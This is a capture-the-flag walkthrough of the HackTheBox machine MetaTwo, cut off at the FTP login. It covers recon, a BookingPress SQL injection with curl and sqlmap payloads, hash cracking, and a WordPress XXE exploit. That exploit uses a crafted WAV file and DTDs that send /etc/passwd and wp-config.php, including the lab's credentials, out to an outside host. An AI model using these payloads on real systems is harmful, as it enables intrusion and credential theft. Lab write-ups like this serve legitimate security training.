---
title: HTB: MetaTwo
url: https://0xdf.gitlab.io/2023/04/29/htb-metatwo.html
date: 2023-04-29T13:45:00+00:00
difficulty: Easy [20]
os: Linux
tags: htb-metatwo, ctf, hackthebox, nmap, wfuzz, php, wordpress, bookingpress, cve-2022-0739, sqli, sqlmap, john, xxe, cve-2021-29447, credentials, passpie, pgp, gpg, cpts-like
---

![MetaTwo](/img/metatwo-cover.png)

MetaTwo starts with a simple WordPress blog using the BookingPress plugin to manage booking events. I’ll find an unauthenticated SQL injection in that plugin and use it to get access to the WP admin panel as an account that can manage media uploads. I’ll exploit an XML external entity (XXE) injection to read files from the host, reading the WP configuration, and getting the creds for the FTP server. On the FTP server I’ll find a script that is sending emails, and use the creds from that to get a shell on the host. The user has a Passpie instance that stores the root password. I’ll crack the PGP key protecting the password and get a shell as root.

## Box Info

| Name | [MetaTwo](https://hackthebox.com/machines/metatwo)  [MetaTwo](https://hackthebox.com/machines/metatwo) [Play on HackTheBox](https://hackthebox.com/machines/metatwo) |
| --- | --- |
| Release Date | [29 Oct 2022](https://twitter.com/hackthebox_eu/status/1585692877597835293) |
| Retire Date | 29 Apr 2023 |
| OS | Linux Linux |
| Base Points | Easy [20] |
| Rated Difficulty | Rated difficulty for MetaTwo |
| Radar Graph | Radar chart for MetaTwo |
| First Blood User | 00:30:23[JoshSH JoshSH](https://app.hackthebox.com/users/269501) |
| First Blood Root | 00:36:51[jkr jkr](https://app.hackthebox.com/users/77141) |
| Creator | [Nauten Nauten](https://app.hackthebox.com/users/27582) |

## Recon

### nmap

`nmap` finds three open TCP ports, FTP (21), SSH (22), and HTTP (80):

```

oxdf@hacky$ nmap -p- --min-rate 10000 10.10.11.186
Starting Nmap 7.80 ( https://nmap.org ) at 2023-04-21 18:09 EDT
Nmap scan report for 10.10.11.186
Host is up (0.083s latency).
Not shown: 65532 closed ports
PORT   STATE SERVICE
21/tcp open  ftp
22/tcp open  ssh
80/tcp open  http

Nmap done: 1 IP address (1 host up) scanned in 6.86 seconds
oxdf@hacky$ nmap -p 21,22,80 -sCV 10.10.11.186
Starting Nmap 7.80 ( https://nmap.org ) at 2023-04-21 18:09 EDT
Nmap scan report for 10.10.11.186
Host is up (0.084s latency).

PORT   STATE SERVICE VERSION
21/tcp open  ftp?
| fingerprint-strings: 
|   GenericLines: 
|     220 ProFTPD Server (Debian) [::ffff:10.10.11.186]
|     Invalid command: try being more creative
|_    Invalid command: try being more creative
22/tcp open  ssh     OpenSSH 8.4p1 Debian 5+deb11u1 (protocol 2.0)
80/tcp open  http    nginx 1.18.0
|_http-server-header: nginx/1.18.0
|_http-title: Did not follow redirect to http://metapress.htb/
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port21-TCP:V=7.80%I=7%D=4/21%Time=644309B4%P=x86_64-pc-linux-gnu%r(Gene
SF:ricLines,8F,"220\x20ProFTPD\x20Server\x20\(Debian\)\x20\[::ffff:10\.10\
SF:.11\.186\]\r\n500\x20Invalid\x20command:\x20try\x20being\x20more\x20cre
SF:ative\r\n500\x20Invalid\x20command:\x20try\x20being\x20more\x20creative
SF:\r\n");
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 205.88 seconds

```

Based on the [OpenSSH](https://packages.debian.org/search?keywords=openssh-server), the host is likely running Debian 11 bullseye. HTTP has a redirect to `metapress.htb`.

### FTP - TCP 21

`nmap` is typically pretty good about identifying anonymous login on FTP (and it doesn’t here), but I’ll check just in case. Typically if it’s enabled, I can connect with the username “anonymous” and any (or a blank) password. It fails here:

```

oxdf@hacky$ ftp 10.10.11.186
Connected to 10.10.11.186.
220 ProFTPD Server (Debian) [::ffff:10.10.11.186]
Name (10.10.11.186:oxdf): anonymous
331 Password required for anonymous
Password: 
530 Login incorrect.
ftp: Login failed

```

I’ll have to check back when I have creds.

### Subdomain Fuzz

Because there’s use of domain names and virtual host routing, I’ll fuzz for other subdomains with `wfuzz`. I’m going to send tons of requests changing the `Host` header to see if I get a different response.

I’ll start with no filter, and quickly Crtl-c to kill it:

```

oxdf@hacky$ wfuzz -u http://10.10.11.186 -H "Host: FUZZ.metapress.htb" -w /opt/SecLists/Discovery/DNS/subdomains-top1million-5000.txt 
********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: http://10.10.11.186/
Total requests: 4989

=====================================================================
ID           Response   Lines    Word       Chars       Payload
=====================================================================

000000001:   302        7 L      9 W        145 Ch      "www"
000000032:   302        7 L      9 W        145 Ch      "mysql"
000000029:   302        7 L      9 W        145 Ch      "old"
000000015:   302        7 L      9 W        145 Ch      "ns"
000000003:   302        7 L      9 W        145 Ch      "ftp"
000000030:   302        7 L      9 W        145 Ch      "new"
000000031:   302        7 L      9 W        145 Ch      "mobile"
000000028:   302        7 L      9 W        145 Ch      "imap"
^C

```

The default case is a 302 of length 145. I’ll add `--hh 145` to hide those responses, and start again:

```

oxdf@hacky$ wfuzz -u http://10.10.11.186 -H "Host: FUZZ.metapress.htb" -w /opt/SecLists/Discovery/DNS/subdomains-top1million-5000.txt --hh 145
********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: http://10.10.11.186/
Total requests: 4989

=====================================================================
ID           Response   Lines    Word       Chars       Payload
=====================================================================

Total time: 0
Processed Requests: 4989
Filtered Requests: 4989
Requests/sec.: 0

```

It finds nothing. I’ll add the domain to my `/etc/hosts` file:

```
10.10.11.186 metapress.htb

```

### metapress.htb - TCP 80

#### Site

The site is for a soon to launch service that doesn’t say much about what it is:

![image-20230421182624151](/img/image-20230421182624151.png)

There’s a footer at the bottom of all pages that a few interesting elements:
- The site is built using the [WordPress](https://wordpress.com/) content management system (CMS).
- A link to a single post, “Welcome on board!”.
- A search bar that goes to `/?s=[entered term]` and seems to work for searching, though it only ever finds the single post.

The post doesn’t say much, but has a link to `/events/` that has some kind of widget for scheduling events:

[![image-20230422145034079](/img/image-20230422145034079.png)](/img/image-20230422145034079.png)

[*Click for full image*](/img/image-20230422145034079.png)

This is clearly some kind of WordPress plugin handling the scheduling.

#### Tech Stack

The site says it’s WordPress, and that’s confirmed looking at the page source. Specifically on the scheduling page:

![image-20230422150127004](/img/image-20230422150127004.png)

Not only is there a `wp-content` directory, but references to “bookingpress-appointment-booking”, which is likely the plugin for scheduling, and seems to match nicely with [this](https://www.bookingpressplugin.com/). Also in the page is a good indication of the WordPress version, 5.6.2:

![image-20230422150431176](/img/image-20230422150431176.png)

Given that it’s WordPress, it’s written in PHP, which is also in the HTTP response headers:

```

HTTP/1.1 200 OK
Server: nginx/1.18.0
Date: Sat, 22 Apr 2023 18:37:06 GMT
Content-Type: text/html; charset=UTF-8
Connection: close
X-Powered-By: PHP/8.0.24
Expires: Thu, 19 Nov 1981 08:52:00 GMT
Cache-Control: no-store, no-cache, must-revalidate
Pragma: no-cache
Link: <http://metapress.htb/wp-json/>; rel="https://api.w.org/"
Content-Length: 10342

```

Given the WordPress site, I can run [wpscan](https://wpscan.com/) or brute force directories with [FeroxBuster](https://github.com/epi052/feroxbuster), but I actually have all I need right now.

## Shell as jnelson

### SQL Injection in BookingPress

#### Identify Exploit

Searching for exploits in the BookingPress plugin finds an unauthenticated SQL injection in version less than 1.0.11:

![image-20230422161102244](/img/image-20230422161102244.png)

#### Exploit Details

I’ll ignore the links that reference MetaTwo and start with the [wpscan link](https://wpscan.com/vulnerability/388cd42d-b61a-42a4-8604-99b812db2357) which offers these steps as a proof of concept:
- Create a new “category” and associate it with a new “service” via the BookingPress admin menu (`/wp-admin/admin.php?page=bookingpress_services`)
- Create a new page with the “[bookingpress\_form]” shortcode embedded (the “BookingPress Step-by-step Wizard Form”)
- Visit the just created page as an unauthenticated user and extract the “nonce” (view source -> search for “action:’bookingpress\_front\_get\_category\_services’”)
- Invoke the following curl command:

```

curl -i 'https://example.com/wp-admin/admin-ajax.php' \
  --data 'action=bookingpress_front_get_category_services&_wpnonce=8cc8b79544&category_id=33&total_service=-7502) UNION ALL SELECT @@version,@@version_comment,@@version_compile_os,1,2,3,4,5,6-- -'

```

The first two steps are something that someone setting up the environment would do. Step three is to get the nonce. A nonce (short for “[number once]”(https://www.okta.com/identity-101/nonce/)) is just a random value that’s meant to be used once.

Step 4 is a UNION injection, which seems to show that there are nine columns in the table being queried. On success, I should see the version, version comment, the os, potentially the numbers 1 through 6 in the result.

#### POC

On `/events/`, I’ll find the nonce in the source:

![image-20230422161549652](/img/image-20230422161549652.png)

Now I’ll make that `curl`:

![image-20230422161940976](/img/image-20230422161940976.png)

It looks like potentially all of the values are displayed back.

#### sqlmap

Despite the argument being called nonce, I am able to use the same value again and again. I’ll run that same `curl` with `-x http://127.0.0.1:8080` to proxy it through my Burp instance. Now I’ll right click on the request, and “Copy to file”. The resulting file looks like:

```

POST /wp-admin/admin-ajax.php HTTP/1.1
Host: metapress.htb
User-Agent: curl/7.81.0
Accept: */*
Content-Length: 185
Content-Type: application/x-www-form-urlencoded
Connection: close

action=bookingpress_front_get_category_services&_wpnonce=6027d5fa3e&category_id=33&total_service=-7502) UNION ALL SELECT @@version,@@version_comment,@@version_compile_os,1,2,3,4,5,6-- -

```

I’ll edit the injection payload out, replacing it with a number:

```

POST /wp-admin/admin-ajax.php HTTP/1.1
Host: metapress.htb
User-Agent: curl/7.81.0
Accept: */*
Content-Length: 185
Content-Type: application/x-www-form-urlencoded
Connection: close

action=bookingpress_front_get_category_services&_wpnonce=6027d5fa3e&category_id=33&total_service=223

```

Now when I run `sqlmap`, I can give it `-r sqli.req` (the file name with that request) and I’ll give it `-p total_service` to show it where to look for the injection (it would find it eventually without that, but this speeds things up by reducing the number of places to check):

```

oxdf@hacky$ sqlmap -r sqli.req -p total_service
...[snip]...
[06:36:25] [INFO] parsing HTTP request from 'sqli.req'
...[snip]...
[06:36:40] [INFO] POST parameter 'total_service' appears to be 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)' injectable 
it looks like the back-end DBMS is 'MySQL'. Do you want to skip test payloads specific for other DBMSes? [Y/n] Y
for the remaining tests, do you want to include all tests for 'MySQL' extending provided level (1) and risk (1) values? [Y/n] Y
[06:37:00] [INFO] testing 'Generic UNION query (NULL) - 1 to 20 columns'
[06:37:00] [INFO] automatically extending ranges for UNION query injection technique tests as there is at least one other (potential) technique found
[06:37:03] [INFO] target URL appears to be UNION injectable with 9 columns
[06:37:03] [INFO] POST parameter 'total_service' is 'Generic UNION query (NULL) - 1 to 20 columns' injectable
POST parameter 'total_service' is vulnerable. Do you want to keep testing the others (if any)? [y/N] N
sqlmap identified the following injection point(s) with a total of 68 HTTP(s) requests:
---
Parameter: total_service (POST)
    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: action=bookingpress_front_get_category_services&_wpnonce=6027d5fa3e&category_id=33&total_service=12) AND (SELECT 9620 FROM (SELECT(SLEEP(5)))HbIg) AND (7517=7517

    Type: UNION query
    Title: Generic UNION query (NULL) - 9 columns
    Payload: action=bookingpress_front_get_category_services&_wpnonce=6027d5fa3e&category_id=33&total_service=12) UNION ALL SELECT NULL,NULL,CONCAT(0x7171707a71,0x6869596c506779626d6a435a70725075464a764d4353715a6859574f6c7a4a715a646b4e474d6f52,0x7178787171),NULL,NULL,NULL,NULL,NULL,NULL-- -
---
[06:37:22] [INFO] the back-end DBMS is MySQL
web application technology: Nginx 1.18.0, PHP 8.0.24
back-end DBMS: MySQL >= 5.0.12 (MariaDB fork)
...[snip]...

```

### WordPress Login

#### Enumerate Database

Now that `sqlmap` has identified the injection, I can use it to enumerate the database. `--dbs` will list the databases:

```

oxdf@hacky$ sqlmap -r sqli.req -p total_service --dbs
...[snip]...
available databases [2]:
[*] blog
[*] information_schema
...[snip]...

```

To check out the tables in `blog`, I’ll use `-D blog` and `--tables`:

```

oxdf@hacky$ sqlmap -r sqli.req -p total_service -D blog --tables
...[snip]...
Database: blog
[27 tables]
+--------------------------------------+
| wp_bookingpress_appointment_bookings |
| wp_bookingpress_categories           |
| wp_bookingpress_customers            |
| wp_bookingpress_customers_meta       |
| wp_bookingpress_customize_settings   |
| wp_bookingpress_debug_payment_log    |
| wp_bookingpress_default_daysoff      |
| wp_bookingpress_default_workhours    |
| wp_bookingpress_entries              |
| wp_bookingpress_form_fields          |
| wp_bookingpress_notifications        |
| wp_bookingpress_payment_logs         |
| wp_bookingpress_services             |
| wp_bookingpress_servicesmeta         |
| wp_bookingpress_settings             |
| wp_commentmeta                       |
| wp_comments                          |
| wp_links                             |
| wp_options                           |
| wp_postmeta                          |
| wp_posts                             |
| wp_term_relationships                |
| wp_term_taxonomy                     |
| wp_termmeta                          |
| wp_terms                             |
| wp_usermeta                          |
| wp_users                             |
+--------------------------------------+
...[snip]...

```

`wp_users` is always a good place to start. I’ll dump that table with `-T wp_users` and `--dump`:

```

oxdf@hacky$ sqlmap -r sqli.req -p total_service -D blog -T wp_users --dump
...[snip]...
Database: blog
Table: wp_users
[2 entries]
+----+----------------------+------------------------------------+-----------------------+------------+-------------+--------------+---------------+---------------------+---------------------+
| ID | user_url             | user_pass                          | user_email            | user_login | user_status | display_name | user_nicename | user_registered     | user_activation_key |
+----+----------------------+------------------------------------+-----------------------+------------+-------------+--------------+---------------+---------------------+---------------------+
| 1  | http://metapress.htb | $P$BGrGrgf2wToBS79i07Rk9sN4Fzk.TV. | admin@metapress.htb   | admin      | 0           | admin        | admin         | 2022-06-23 17:58:28 | <blank>             |
| 2  | <blank>              | $P$B4aNM28N0E.tMy/JIcnVMZbGcU16Q70 | manager@metapress.htb | manager    | 0           | manager      | manager       | 2022-06-23 18:07:55 | <blank>             |
+----+----------------------+------------------------------------+-----------------------+------------+-------------+--------------+---------------+---------------------+---------------------+
...[snip]...

```

There are other tables I can look at, but they are pretty empty.

#### Crack Hashes

I’ll save the two hashes with their usernames in a file, `wp.hashes`:

```

admin:$P$BGrGrgf2wToBS79i07Rk9sN4Fzk.TV.
manager:$P$B4aNM28N0E.tMy/JIcnVMZbGcU16Q70

```

`hashcat` takes that file, identifies the hash type, and cracks the manager password very quickly:

```

$ hashcat wp.hashes /usr/share/wordlists/rockyou.txt --user
hashcat (v6.2.6) starting in autodetect mode
...[snip]...
Hash-mode was not specified with -m. Attempting to auto-detect hash mode.
The following mode was auto-detected as the only one matching your input hash:

400 | phpass | Generic KDF
...[snip]...
$P$B4aNM28N0E.tMy/JIcnVMZbGcU16Q70:partylikearockstar     
...[snip]...

```

I need to give it `--user` to tell it to remove up to the first `:` as the username, and use the hash after that. On my computer it took about 11 minutes to go through all of `rockyou.txt`, and it fails to break admin’s hash.

#### WordPress Login

Those creds do not work for SSH or FTP.

To log in to WordPress, I’ll visit `/wp-admin` and it redirects to the login page:

![image-20230423070631463](/img/image-20230423070631463.png)

Unsurprisingly the manager creds work here:

![image-20230423070709413](/img/image-20230423070709413.png)

### FTP Access

#### WordPress Enumeration

manager doesn’t have very much priviliege in this admin panel. If I had access as an admin user, I would look at modifying a template or uploading a malicious plugin to get execution via WordPress. manager is basically limited to media uploads.

Some searching for vulnerabilities in WordPress 5.6.2 leads to [this post](https://blog.wpsec.com/wordpress-xxe-in-media-library-cve-2021-29447/) from the WPSec blog about CVE-2021-29447, an XML external entities (XXE) vulnerability in the media manager for this version of WordPress. The post has a ton of detail of exactly what is going on and is a good read.

#### POC

To exploit this, I’ll need two files. First, I’ll make a `payload.wav` file, using the command from the post, replacing their IP with mine:

```

oxdf@hacky$ echo -en 'RIFF\xb8\x00\x00\x00WAVEiXML\x7b\x00\x00\x00<?xml version="1.0"?><!DOCTYPE ANY[<!ENTITY % remote SYSTEM '"'"'http://10.10.14.6/evil.dtd'"'"'>%remote;%init;%trick;]>\x00' > payload.wav

```

This has the [magic bytes](https://en.wikipedia.org/wiki/List_of_file_signatures) of a waveform audio file, `RIFF????WAVE` (where `?` is anything), but then it has an XML body with an XXE attack payload. It will reach back to my server and try to load a `.dtd` file.

A DTD (Document Type Definition) file is used to define the structure and content of an XML (eXtensible Markup Language) document. It specifies the elements, attributes, and their relationship to one another that can appear in the XML document. The DTD file acts as a set of rules that the XML document must follow to be considered valid.

The second file to create is that `.dtd` file:

```

<!ENTITY % file SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">
<!ENTITY % init "<!ENTITY &#x25; trick SYSTEM 'http://10.10.14.6/?p=%file;'>" >

```

This file does two things. It reads the `/etc/passwd` file, base64-encodes the result, storing it as a XML variable `file`. Next it tries to load `http://10.10.14.6/?p=%file;`, effectively exfiling the data to my server.

I’ll start a Python webserver with the `.dtd` file in that directory, and upload the `.wav` file into the media manager:

![image-20230423074430514](/img/image-20230423074430514.png)

It looks successfully uploaded, and there’s contact at my server:

```
10.10.11.186 - - [23/Apr/2023 07:56:47] "GET /evil.dtd HTTP/1.1" 200 -
10.10.11.186 - - [23/Apr/2023 07:56:47] "GET /?p=cm9vdDp4OjA6MDpyb290Oi9yb290Oi9iaW4vYmFzaApkYWVtb246eDoxOjE6ZGFlbW9uOi91c3Ivc2JpbjovdXNyL3NiaW4vbm9sb2dpbgpiaW46eDoyOjI6YmluOi9iaW46L3Vzci9zYmluL25vbG9naW4Kc3lzOng6MzozOnN5czovZGV2Oi91c3Ivc2Jpbi9ub2xvZ2luCnN5bmM6eDo0OjY1NTM0OnN5bmM6L2JpbjovYmluL3N5bmMKZ2FtZXM6eDo1OjYwOmdhbWVzOi91c3IvZ2FtZXM6L3Vzci9zYmluL25vbG9naW4KbWFuOng6NjoxMjptYW46L3Zhci9jYWNoZS9tYW46L3Vzci9zYmluL25vbG9naW4KbHA6eDo3Ojc6bHA6L3Zhci9zcG9vbC9scGQ6L3Vzci9zYmluL25vbG9naW4KbWFpbDp4Ojg6ODptYWlsOi92YXIvbWFpbDovdXNyL3NiaW4vbm9sb2dpbgpuZXdzOng6OTo5Om5ld3M6L3Zhci9zcG9vbC9uZXdzOi91c3Ivc2Jpbi9ub2xvZ2luCnV1Y3A6eDoxMDoxMDp1dWNwOi92YXIvc3Bvb2wvdXVjcDovdXNyL3NiaW4vbm9sb2dpbgpwcm94eTp4OjEzOjEzOnByb3h5Oi9iaW46L3Vzci9zYmluL25vbG9naW4Kd3d3LWRhdGE6eDozMzozMzp3d3ctZGF0YTovdmFyL3d3dzovdXNyL3NiaW4vbm9sb2dpbgpiYWNrdXA6eDozNDozNDpiYWNrdXA6L3Zhci9iYWNrdXBzOi91c3Ivc2Jpbi9ub2xvZ2luCmxpc3Q6eDozODozODpNYWlsaW5nIExpc3QgTWFuYWdlcjovdmFyL2xpc3Q6L3Vzci9zYmluL25vbG9naW4KaXJjOng6Mzk6Mzk6aXJjZDovcnVuL2lyY2Q6L3Vzci9zYmluL25vbG9naW4KZ25hdHM6eDo0MTo0MTpHbmF0cyBCdWctUmVwb3J0aW5nIFN5c3RlbSAoYWRtaW4pOi92YXIvbGliL2duYXRzOi91c3Ivc2Jpbi9ub2xvZ2luCm5vYm9keTp4OjY1NTM0OjY1NTM0Om5vYm9keTovbm9uZXhpc3RlbnQ6L3Vzci9zYmluL25vbG9naW4KX2FwdDp4OjEwMDo2NTUzNDo6L25vbmV4aXN0ZW50Oi91c3Ivc2Jpbi9ub2xvZ2luCnN5c3RlbWQtbmV0d29yazp4OjEwMToxMDI6c3lzdGVtZCBOZXR3b3JrIE1hbmFnZW1lbnQsLCw6L3J1bi9zeXN0ZW1kOi91c3Ivc2Jpbi9ub2xvZ2luCnN5c3RlbWQtcmVzb2x2ZTp4OjEwMjoxMDM6c3lzdGVtZCBSZXNvbHZlciwsLDovcnVuL3N5c3RlbWQ6L3Vzci9zYmluL25vbG9naW4KbWVzc2FnZWJ1czp4OjEwMzoxMDk6Oi9ub25leGlzdGVudDovdXNyL3NiaW4vbm9sb2dpbgpzc2hkOng6MTA0OjY1NTM0OjovcnVuL3NzaGQ6L3Vzci9zYmluL25vbG9naW4Kam5lbHNvbjp4OjEwMDA6MTAwMDpqbmVsc29uLCwsOi9ob21lL2puZWxzb246L2Jpbi9iYXNoCnN5c3RlbWQtdGltZXN5bmM6eDo5OTk6OTk5OnN5c3RlbWQgVGltZSBTeW5jaHJvbml6YXRpb246LzovdXNyL3NiaW4vbm9sb2dpbgpzeXN0ZW1kLWNvcmVkdW1wOng6OTk4Ojk5ODpzeXN0ZW1kIENvcmUgRHVtcGVyOi86L3Vzci9zYmluL25vbG9naW4KbXlzcWw6eDoxMDU6MTExOk15U1FMIFNlcnZlciwsLDovbm9uZXhpc3RlbnQ6L2Jpbi9mYWxzZQpwcm9mdHBkOng6MTA2OjY1NTM0OjovcnVuL3Byb2Z0cGQ6L3Vzci9zYmluL25vbG9naW4KZnRwOng6MTA3OjY1NTM0Ojovc3J2L2Z0cDovdXNyL3NiaW4vbm9sb2dpbgo= HTTP/1.1" 200 -

```

That decodes to a `passwd` file:

```

oxdf@hacky$ echo "cm9vdDp4OjA6MDpyb290Oi9yb290Oi9iaW4vYmFzaApkYWVtb246eDoxOjE6ZGFlbW9uOi91c3Ivc2JpbjovdXNyL3NiaW4vbm9sb2dpbgpiaW46eDoyOjI6YmluOi9iaW46L3Vzci9zYmluL25vbG9naW4Kc3lzOng6MzozOnN5czovZGV2Oi91c3Ivc2Jpbi9ub2xvZ2luCnN5bmM6eDo0OjY1NTM0OnN5bmM6L2JpbjovYmluL3N5bmMKZ2FtZXM6eDo1OjYwOmdhbWVzOi91c3IvZ2FtZXM6L3Vzci9zYmluL25vbG9naW4KbWFuOng6NjoxMjptYW46L3Zhci9jYWNoZS9tYW46L3Vzci9zYmluL25vbG9naW4KbHA6eDo3Ojc6bHA6L3Zhci9zcG9vbC9scGQ6L3Vzci9zYmluL25vbG9naW4KbWFpbDp4Ojg6ODptYWlsOi92YXIvbWFpbDovdXNyL3NiaW4vbm9sb2dpbgpuZXdzOng6OTo5Om5ld3M6L3Zhci9zcG9vbC9uZXdzOi91c3Ivc2Jpbi9ub2xvZ2luCnV1Y3A6eDoxMDoxMDp1dWNwOi92YXIvc3Bvb2wvdXVjcDovdXNyL3NiaW4vbm9sb2dpbgpwcm94eTp4OjEzOjEzOnByb3h5Oi9iaW46L3Vzci9zYmluL25vbG9naW4Kd3d3LWRhdGE6eDozMzozMzp3d3ctZGF0YTovdmFyL3d3dzovdXNyL3NiaW4vbm9sb2dpbgpiYWNrdXA6eDozNDozNDpiYWNrdXA6L3Zhci9iYWNrdXBzOi91c3Ivc2Jpbi9ub2xvZ2luCmxpc3Q6eDozODozODpNYWlsaW5nIExpc3QgTWFuYWdlcjovdmFyL2xpc3Q6L3Vzci9zYmluL25vbG9naW4KaXJjOng6Mzk6Mzk6aXJjZDovcnVuL2lyY2Q6L3Vzci9zYmluL25vbG9naW4KZ25hdHM6eDo0MTo0MTpHbmF0cyBCdWctUmVwb3J0aW5nIFN5c3RlbSAoYWRtaW4pOi92YXIvbGliL2duYXRzOi91c3Ivc2Jpbi9ub2xvZ2luCm5vYm9keTp4OjY1NTM0OjY1NTM0Om5vYm9keTovbm9uZXhpc3RlbnQ6L3Vzci9zYmluL25vbG9naW4KX2FwdDp4OjEwMDo2NTUzNDo6L25vbmV4aXN0ZW50Oi91c3Ivc2Jpbi9ub2xvZ2luCnN5c3RlbWQtbmV0d29yazp4OjEwMToxMDI6c3lzdGVtZCBOZXR3b3JrIE1hbmFnZW1lbnQsLCw6L3J1bi9zeXN0ZW1kOi91c3Ivc2Jpbi9ub2xvZ2luCnN5c3RlbWQtcmVzb2x2ZTp4OjEwMjoxMDM6c3lzdGVtZCBSZXNvbHZlciwsLDovcnVuL3N5c3RlbWQ6L3Vzci9zYmluL25vbG9naW4KbWVzc2FnZWJ1czp4OjEwMzoxMDk6Oi9ub25leGlzdGVudDovdXNyL3NiaW4vbm9sb2dpbgpzc2hkOng6MTA0OjY1NTM0OjovcnVuL3NzaGQ6L3Vzci9zYmluL25vbG9naW4Kam5lbHNvbjp4OjEwMDA6MTAwMDpqbmVsc29uLCwsOi9ob21lL2puZWxzb246L2Jpbi9iYXNoCnN5c3RlbWQtdGltZXN5bmM6eDo5OTk6OTk5OnN5c3RlbWQgVGltZSBTeW5jaHJvbml6YXRpb246LzovdXNyL3NiaW4vbm9sb2dpbgpzeXN0ZW1kLWNvcmVkdW1wOng6OTk4Ojk5ODpzeXN0ZW1kIENvcmUgRHVtcGVyOi86L3Vzci9zYmluL25vbG9naW4KbXlzcWw6eDoxMDU6MTExOk15U1FMIFNlcnZlciwsLDovbm9uZXhpc3RlbnQ6L2Jpbi9mYWxzZQpwcm9mdHBkOng6MTA2OjY1NTM0OjovcnVuL3Byb2Z0cGQ6L3Vzci9zYmluL25vbG9naW4KZnRwOng6MTA3OjY1NTM0Ojovc3J2L2Z0cDovdXNyL3NiaW4vbm9sb2dpbgo=" | base64 -d
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
...[snip]...
jnelson:x:1000:1000:jnelson,,,:/home/jnelson:/bin/bash
...[snip]...

```

I’ll note the user jnelson.

#### Bad POC Rabbit Hole

Before finding the WPSec blog, I wasted a lot of time working with the POC from [this page](https://wpscan.com/vulnerability/cbbe6c17-b24e-4be4-8937-c78472a138b5) from wpsan:

```

payload.wav:

RIFFXXXXWAVEBBBBiXML<!DOCTYPE r [
<!ELEMENT r ANY >
<!ENTITY % sp SYSTEM "http://attacker-url.domain/xxe.dtd">
%sp;
%param1;
]>
<r>&exfil;</r>>

xxe.dtd:

<!ENTITY % data SYSTEM "php://filter/zlib.deflate/convert.base64-encode/resource=../wp-config.php">
<!ENTITY % param1 "<!ENTITY exfil SYSTEM 'http://attacker-url.domain/?%data;'>"> 

```

I couldn’t get it to work, and I believe there are two big issues with this POC. First, it doesn’t tell you that BBBB needs to be replaced by a little-endian length of the payload. Second, the BBBB bytes are in the wrong spot, as they need to be *after* the `iXML`.

#### WP Config

The broken POC above does show something interesting. It’s using a relative path to read `../wp-config.php`. That’s useful, as it means I don’t have to figure out where on the file system the web root is to read this kind of file. I’ll update my `evil.dtd` to use that file path, and upload `payload.wav` again. This time there’s new data in the exfil, and it decodes to:

```

<?php
/** The name of the database for WordPress */
define( 'DB_NAME', 'blog' );                               

/** MySQL database username */                                      
define( 'DB_USER', 'blog' );

/** MySQL database password */                                      
define( 'DB_PASSWORD', '635Aq@TdqrCwXFUZ' );

/** MySQL hostname */
define( 'DB_HOST', 'localhost' );

/** Database Charset to use in creating database tables. */                                                                             
define( 'DB_CHARSET', 'utf8mb4' );                                  

/** The Database Collate type. Don't change this if in doubt. */                                                                        
define( 'DB_COLLATE', '' );

define( 'FS_METHOD', 'ftpext' );                                    
define( 'FTP_USER', 'metapress.htb' );                              
define( 'FTP_PASS', '9NYS_ii@FyL_p5M2NvJ' );                        
define( 'FTP_HOST', 'ftp.metapress.htb' );                          
define( 'FTP_BASE', 'blog/' );                                      
define( 'FTP_SSL', false );                                         

/**#@+                                                              
 * Authentication Unique Keys and Salts.                            
 * @since 2.6.0                                                     
 */                                                                 
define( 'AUTH_KEY',         '?!Z$uGO*A6xOE5x,pweP4i*z;m`|.Z:X@)QRQFXkCRyl7}`rXVG=3 n>+3m?.B/:' );
define( 'SECURE_AUTH_KEY',  'x$i$)b0]b1cup;47`YVua/JHq%*8UA6g]0bwoEW:91EZ9h]rWlVq%IQ66pf{=]a%' );
define( 'LOGGED_IN_KEY',    'J+mxCaP4z<g.6P^t`ziv>dd}EEi%48%JnRq^2MjFiitn#&n+HXv]||E+F~C{qKXy' );
define( 'NONCE_KEY',        'SmeDr$$O0ji;^9]*`~GNe!pX@DvWb4m9Ed=Dd(.r-q{^z(F?)7mxNUg986tQO7O5' );
define( 'AUTH_SALT',        '[;TBgc/,M#)d5f[H*tg50ifT?Zv.5Wx=`l@v$-vH*<~:0]s}d<&M;.,x0z~R>3!D' );
define( 'SECURE_AUTH_SALT', '>`VAs6!G955dJs?$O4zm`.Q;amjW^uJrk_1-dI(SjROdW[S&~omiH^jVC?2-I?I.' );
define( 'LOGGED_IN_SALT',   '4[fS^3!=%?HIopMpkgYboy8-jl^i]Mw}Y d~N=&^JsI`M)FJTJEVI) N#NOidIf=' );
define( 'NONCE_SALT',       '.sU&CQ@IRlh O;5aslY+Fq8QWheSNxd6Ve#}w!Bq,h}V9jKSkTGsv%Y451F8L=bL' );

/**                                                                 
 * WordPress Database Table prefix.                                 
 */                                                                 
$table_prefix = 'wp_';                                              

/**                                                                 
 * For developers: WordPress debugging mode.                        
 * @link https://wordpress.org/support/article/debugging-in-wordpress/                                                                  
 */                                                                 
define( 'WP_DEBUG', false );                                        

/** Absolute path to the WordPress directory. */                                                                                        
if ( ! defined( 'ABSPATH' ) ) {                                     
        define( 'ABSPATH', __DIR__ . '/' );                         
}                                                                   

/** Sets up WordPress vars and included files. */                                                                                       
require_once ABSPATH . 'wp-settings.php'; 

```

#### FTP

WordPress is configured with configuration variables to access FTP:

```

define( 'FS_METHOD', 'ftpext' );                                    
define( 'FTP_USER', 'metapress.htb' );                              
define( 'FTP_PASS', '9NYS_ii@FyL_p5M2NvJ' );                        
define( 'FTP_HOST', 'ftp.metapress.htb' );                          
define( 'FTP_BASE', 'blog/' );                                      
define( 'FTP_SSL', false );   

```

I’ll connect, and it works:

```

oxdf@hacky$ ftp metapress.htb@metapress.htb
Connected to metapress.htb.
220 ProFTPD Server (Debian) [::ffff:10.10.11.186]
331 Password required for metapress.htb
Password: 
